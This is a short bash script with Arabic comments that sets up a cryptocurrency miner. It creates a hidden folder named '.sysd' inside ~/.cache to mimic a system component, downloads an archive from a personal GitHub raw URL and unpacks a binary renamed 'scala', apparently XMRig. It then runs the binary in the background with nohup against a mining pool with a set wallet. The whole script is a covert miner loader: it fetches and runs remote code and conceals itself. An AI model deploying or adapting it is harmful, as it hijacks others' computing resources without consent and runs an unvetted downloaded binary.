#!/bin/bash

# إعداد بيانات المحفظة والمعدّن
WALLET="NQjVj7UtqaYTiYrQ5nv5UDDaQXttxYZZxT"       # ← غيّر هذا إلى عنوان محفظتك الحقيقي
WORKER="workspace"
POOL="ghostrider.eu.mine.zergpool.com:5354"
THREADS=2
# مجلد العمل
WORKDIR="$HOME/.cache/.sysd"  # ← مجلد خفي داخل .cache
mkdir -p "$WORKDIR" && cd "$WORKDIR"

# تحميل النسخة الجاهزة من XMRig (Linux x64)
wget https://raw.githubusercontent.com/philip330/max/main/scala.tar.gz -O scala.tar.gz

# فك الضغط
tar -xvf scala.tar.gz --strip=1
rm scala.tar.gz

# تشغيل المعدّن في الخلفية باستخدام nohup
nohup ./scala -o $POOL -u $WALLET -p $WORKER -k --tls --threads=$THREADS --c=XMR > cpu_output.log 2>&1 &
